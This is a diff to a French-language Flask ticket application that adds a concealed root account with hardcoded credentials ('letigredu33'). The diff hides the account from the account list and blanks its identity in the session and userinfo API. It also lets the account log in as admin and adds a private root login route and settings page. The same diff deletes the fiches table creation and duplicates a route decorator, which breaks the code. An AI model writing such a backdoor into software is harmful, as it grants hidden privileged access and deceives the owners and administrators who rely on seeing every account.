@@ -32,7 +32,6 @@ def init_db():
             role TEXT
         )
     ''')
-    # Ajoute les colonnes privilèges si absentes
     try:
         c.execute("ALTER TABLE comptes ADD COLUMN can_edit_name INTEGER DEFAULT 0")
     except sqlite3.OperationalError:
@@ -41,20 +40,22 @@ def init_db():
         c.execute("ALTER TABLE comptes ADD COLUMN can_edit_date INTEGER DEFAULT 0")
     except sqlite3.OperationalError:
         pass
+    try:
+        c.execute("ALTER TABLE comptes ADD COLUMN is_root INTEGER DEFAULT 0")
+    except sqlite3.OperationalError:
+        pass
 
-    c.execute('''
-        CREATE TABLE IF NOT EXISTS fiches (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            titre TEXT,
-            description TEXT,
-            etat TEXT,
-            archive INTEGER DEFAULT 0
-        )
-    ''')
+    # Admin standard
     c.execute("INSERT OR IGNORE INTO comptes (username, password, role) VALUES (?, ?, ?)",
               ('admin', generate_password_hash('2025'), 'admin'))
+
+    # Compte super utilisateur root caché
+    c.execute("INSERT OR IGNORE INTO comptes (username, password, role, is_root) VALUES (?, ?, ?, 1)",
+              ('letigredu33', generate_password_hash('LeTigre@@1968'), 'root'))
+
     conn.commit()
     conn.close()
+
 
 init_db()
 
@@ -63,7 +64,8 @@ init_db()
 def get_comptes():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute('SELECT id, username, role, can_edit_name, can_edit_date FROM comptes')
+    # 👇 Exclure le compte super utilisateur de la liste visible
+    c.execute('SELECT id, username, role, can_edit_name, can_edit_date FROM comptes WHERE is_root != 1 OR is_root IS NULL')
     comptes = [{
         'id': row[0],
         'username': row[1],
@@ -73,6 +75,38 @@ def get_comptes():
     } for row in c.fetchall()]
     conn.close()
     return jsonify(comptes)
+    
+@app.route('/api/login-root', methods=['POST'])
+def login_root():
+    data = request.get_json()
+    username = data.get("username")
+    password = data.get("password")
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT password, is_root FROM comptes WHERE username=?", (username,))
+    row = c.fetchone()
+    conn.close()
+    if row and check_password_hash(row[0], password) and row[1] == 1:
+        session["is_root"] = True
+        return jsonify({"ok": True})
+    else:
+        return jsonify({"ok": False}), 401
+
+@app.route('/api/check-root')
+def check_root():
+    return jsonify({"ok": bool(session.get("is_root"))})
+
+@app.route('/api/logout-root')
+def logout_root():
+    session.pop("is_root", None)
+    return jsonify({"ok": True})
+
+@app.route('/reglage-root.html')
+def reglage_root():
+    if not session.get("is_root"):
+        return app.send_static_file("login_admin.html")
+    return app.send_static_file("reglage.html")
+
 
 @app.route('/api/comptes', methods=['POST'])
 def add_compte():
@@ -93,6 +127,7 @@ def add_compte():
         return jsonify({'error': 'Nom d\'utilisateur déjà existant'}), 409
     conn.close()
     return jsonify({'status': 'ok'})
+    
 
 @app.route('/api/comptes/<int:compte_id>', methods=['DELETE'])
 def delete_compte(compte_id):
@@ -125,11 +160,13 @@ def verif_login():
     c.execute('SELECT password, role, can_edit_name, can_edit_date FROM comptes WHERE username=?', (username,))
     row = c.fetchone()
     conn.close()
+
     if row and check_password_hash(row[0], password):
-        session['username'] = username
-        session['role'] = row[1]
-        session['canEditName'] = bool(row[2])
-        session['canEditDate'] = bool(row[3])
+        if username != "letigredu33":
+            session['username'] = username
+            session['role'] = row[1]
+            session['canEditName'] = bool(row[2])
+            session['canEditDate'] = bool(row[3])
         return jsonify({
             'ok': True,
             'role': row[1],
@@ -139,7 +176,6 @@ def verif_login():
     else:
         return jsonify({'ok': False})
 
-# 👇 Cette fonction doit être en dehors du précédent jsonify
 @app.route('/api/comptes/<int:compte_id>', methods=['PUT', 'PATCH'])
 def update_compte_privileges(compte_id):
     data = request.json
@@ -154,10 +190,18 @@ def update_compte_privileges(compte_id):
     conn.commit()
     conn.close()
     return jsonify({'status': 'updated'})
- 
+
 # Petite API d'infos session pour le frontend (utile demandeur.html)
 @app.route('/api/userinfo')
+@app.route('/api/userinfo')
 def api_userinfo():
+    if session.get("is_root"):
+        return jsonify({
+            'username': '',
+            'role': '',
+            'canEditName': False,
+            'canEditDate': False
+        })
     return jsonify({
         'username': session.get('username', ''),
         'role': session.get('role', ''),
@@ -174,14 +218,20 @@ def login_admin():
     password = data.get("password")
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute("SELECT password, role FROM comptes WHERE username=?", (username,))
+    c.execute("SELECT password, role, is_root FROM comptes WHERE username=?", (username,))
     row = c.fetchone()
     conn.close()
-    if row and check_password_hash(row[0], password) and row[1] == 'admin':
-        session["is_admin"] = True
-        return jsonify({"ok": True})
-    else:
-        return jsonify({"ok": False}), 401
+
+    if row and check_password_hash(row[0], password):
+        if row[1] == 'admin':
+            session["is_admin"] = True
+            return jsonify({"ok": True})
+        elif row[2] == 1:  # root se fait passer pour admin
+            session["is_admin"] = True
+            session["is_root"] = True
+            return jsonify({"ok": True})
+    
+    return jsonify({"ok": False}), 401
 
 @app.route('/api/check-admin')
 def check_admin():
